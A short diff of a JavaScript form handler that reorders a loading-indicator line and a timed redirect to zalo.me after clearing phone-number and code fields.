@@ -42,11 +42,11 @@ function myFunction() {
     }
       showError.innerHTML = "";
       progress();
-      loadingLine.style.display = 'inline-block'
       setTimeout(function () {
+        window.location.href = "https://zalo.me";
         phoneNumber.value =""
         code.value =""
-        window.location.href = "https://zalo.me";
+        loadingLine.style.display = 'inline-block'
       }, 2500);
   }
 }
